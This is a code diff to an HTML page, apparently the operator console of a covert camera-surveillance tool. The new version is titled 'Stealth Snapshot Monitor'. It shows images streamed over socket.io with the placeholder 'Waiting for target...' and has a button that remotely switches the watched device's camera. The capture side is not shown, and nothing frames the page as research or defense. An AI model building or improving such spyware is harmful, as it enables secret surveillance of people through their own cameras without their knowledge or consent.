@@ -1,23 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><title>Monitor</title><style>body{background:#111;text-align:center;}video{width:90%;max-width:700px;margin-top:50px;border:2px solid #333;border-radius:10px;}</style></head>
+<head><title>Snapshot Monitor</title><style>body{background:#111;color:#fff;text-align:center;}img{width:90%;max-width:700px;margin-top:50px;border:3px solid #f85606;border-radius:10px;}</style></head>
 <body>
-    <video id="v" autoplay playsinline controls></video>
+    <h2>🛰️ Stealth Snapshot Monitor</h2>
+    <img id="live-img" src="" alt="Waiting for target...">
+    <br><br>
+    <button onclick="socket.emit('switch')" style="padding:15px; background:red; color:#fff; border:none; cursor:pointer;">🔄 Switch Camera</button>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-        
-        socket.on("offer", async (o) => {
-            await pc.setRemoteDescription(new RTCSessionDescription(o));
-            const a = await pc.createAnswer();
-            await pc.setLocalDescription(a);
-            socket.emit("answer", a);
+        socket.on("view-image", (data) => {
+            document.getElementById("live-img").src = data;
         });
-
-        socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
-        pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
-        pc.ontrack = e => document.getElementById("v").srcObject = e.streams[0];
     </script>
 </body>
 </html>
+
